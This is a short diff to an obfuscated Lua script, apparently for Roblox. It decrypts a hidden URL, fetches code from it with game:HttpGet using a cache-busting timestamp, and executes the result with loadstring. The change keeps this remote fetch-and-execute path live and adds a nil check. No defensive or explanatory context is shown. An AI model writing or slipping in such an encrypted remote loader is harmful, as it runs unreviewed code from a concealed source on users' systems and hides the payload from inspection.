@@ -9,5 +9,9 @@ return (function(...)
         _i = (_i + 1) % 256; _j = (_j + _s[_i]) % 256; _s[_i], _s[_j] = _s[_j], _s[_i]
         _r[x] = string.char(bit32.bxor(_e[x], _s[(_s[_i] + _s[_j]) % 256]))
     end
-    return loadstring(game:HttpGet(table.concat(_r) .. string.char(38,118,61) .. tostring(tick())))()
+    local _res = game:HttpGet(table.concat(_r) .. string.char(38,118,61) .. tostring(tick()))
+    local _fn = loadstring(_res)
+    if _fn then
+        return _fn()
+    end
 end)(...)
